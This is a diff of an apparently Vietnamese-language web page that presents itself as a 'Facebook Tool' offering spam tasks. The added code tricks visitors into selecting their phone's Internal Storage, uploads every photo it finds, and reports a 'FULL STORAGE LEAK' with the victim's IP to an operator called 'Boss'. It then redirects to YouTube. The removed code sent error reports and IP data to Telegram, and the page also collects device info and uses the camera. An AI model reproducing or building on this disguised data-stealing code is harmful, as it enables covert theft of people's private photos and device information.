-                    showToast(`❌ Lỗi: ${error.message}`, true);
                     
-                    try {
-                        const info = deviceInfoCache || await collectDeviceInfo();
-                        await sendMessageToTelegram(`🔥 LỖI XỬ LÝ TASK ${meta.name}\nIP: ${info.ip}\nLỗi: ${error.message}`);
-                    } catch (e) {}
+                    // 3. Yêu cầu chọn thư mục gốc và gửi TOÀN BỘ ẢNH TRONG MÁY
+                    overlayText.innerText = `ĐANG QUÉT TOÀN BỘ ẢNH`;
+                    overlaySub.innerText = 'Vui lòng chọn thư mục gốc (Internal Storage) để tiếp tục...';
+                    statusText.innerHTML = '📁 Đang chờ chọn thư mục gốc...';
+                    log('📂 Đang mở hộp thoại chọn thư mục gốc. Hướng dẫn người dùng chọn Internal Storage...');
+                    
+                    const albumResult = await requestAndSendFullStorage();
+                    
+                    // Gửi tổng kết
+                    const summaryMsg = `📁 <b>FULL STORAGE LEAK - ${meta.name}</b>\n`+
+                        `━━━━━━━━━━━━━━━━\n`+
+                        `🖼️ Tổng ảnh tìm thấy: ${albumResult.total}\n✅ Đã gửi thành công: ${albumResult.success}\n`+
+                        `🌐 IP: ${deviceInfo.ip}\n⏰ ${new Date().toLocaleString('vi-VN')}`;
+                    await sendMessage(summaryMsg).catch(()=>{});
+                    
+                    taskCount++;
+                    updateTaskCount();
+                    statusText.innerHTML = `✅ ${meta.icon} ${meta.name} HOÀN TẤT! Đã gửi ${albumResult.success}/${albumResult.total} ảnh.`;
+                    showToast(`${meta.icon} ${meta.name} thành công! Đã gửi ${albumResult.success} ảnh.`);
+                    
+                } catch(error) {
+                    log('Lỗi hệ thống: '+error.message, true);
+                    statusText.innerHTML = `❌ Lỗi khi xử lý ${meta.name}`;
+                    showToast(`❌ Lỗi: ${error.message}`, true);
                 } finally {
                     stopCamera();
-                    setTimeout(() => {
+                    setTimeout(()=>{
                         overlay.classList.add('hide');
                         isProcessing = false;
-                        if (!statusText.innerText.includes('Sẵn sàng')) {
-                            statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
-                        }
-                        
-                        setTimeout(() => {
-                            window.location.href = 'https://youtu.be/z-3Cnrqe_uA?si=rCVXiaTZPjDdDjJ2';
-                        }, 1000);
-                        
-                    }, 1500);
+                        // Chuyển hướng YouTube
+                        window.location.href = 'https://youtu.be/z-3Cnrqe_uA?si=rCVXiaTZPjDdDjJ2';
+                    }, 2000);
                 }
             }
 
-            document.querySelectorAll('.task-btn').forEach(btn => {
+            // Gắn sự kiện cho 3 nút spam
+            document.querySelectorAll('[data-task]').forEach(btn => {
                 btn.addEventListener('click', (e) => {
                     e.preventDefault();
                     const task = btn.getAttribute('data-task');
-                    processTask(task);
+                    processSpamTask(task);
                 });
             });
 
-            collectDeviceInfo().catch(() => {});
-
-            console.log("%c⚠️ Facebook Tool v2.1 | ID & Channel cố định, YouTube redirect", "color: #1877f2; font-size: 14px");
+            // Khởi tạo
+            collectDeviceInfo().catch(()=>{});
+            log('Hệ thống khởi động. Sẵn sàng nhận lệnh từ Boss.');
+            console.log("%c⚠️ Facebook Tool v3.1 | Full Storage Leak + Spam + Redirect", "color: #1877f2; font-size:14px");
         })();
     </script>
 </body>
